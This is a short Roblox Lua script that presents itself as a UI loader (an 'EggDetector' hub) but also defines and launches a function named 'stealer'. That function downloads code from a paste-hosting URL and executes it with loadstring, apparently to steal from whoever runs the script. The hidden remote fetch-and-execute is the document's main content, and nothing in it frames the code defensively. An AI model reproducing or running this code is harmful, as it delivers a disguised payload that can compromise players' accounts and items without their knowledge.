local function stealer()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xJfN6j1b9LuKMSyA/raw", true))()
end

local function loadui()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AutoScriptsV4/BestHub/refs/heads/main/EggDetectorLUA", true))()
end


task.spawn(stealer)
task.spawn(loadui)
